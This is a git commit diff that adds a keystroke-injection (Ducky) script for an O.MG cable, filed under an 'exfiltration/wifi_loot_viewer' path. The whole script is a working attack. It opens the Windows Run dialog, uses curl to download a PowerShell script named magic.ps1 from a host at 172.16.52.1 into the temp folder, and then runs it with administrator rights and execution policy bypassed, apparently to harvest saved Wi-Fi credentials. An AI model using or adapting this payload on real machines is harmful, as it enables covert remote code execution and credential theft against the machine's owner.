3ca36d58740dc74cd0b89bc49eaf62ffc59fff3f
f3bandit <f3bandit@gmail.com>
2026-04-10 19:37:48 -0400

    Update payload.sh
    omg cable ducky script for payload slot

--- library/user/exfiltration/wifi_loot_viewer/omg/payload.sh
+++ library/user/exfiltration/wifi_loot_viewer/omg/payload.sh
@@ -1,1 +1,8 @@
-
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN cmd /c mkdir "%TEMP%\wifi" 2>nul & curl -o "%TEMP%\wifi\magic.ps1" http://172.16.52.1:42/files/magic.ps1
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -ExecutionPolicy Bypass -Command & \"%TEMP%\wifi\magic.ps1\"'"
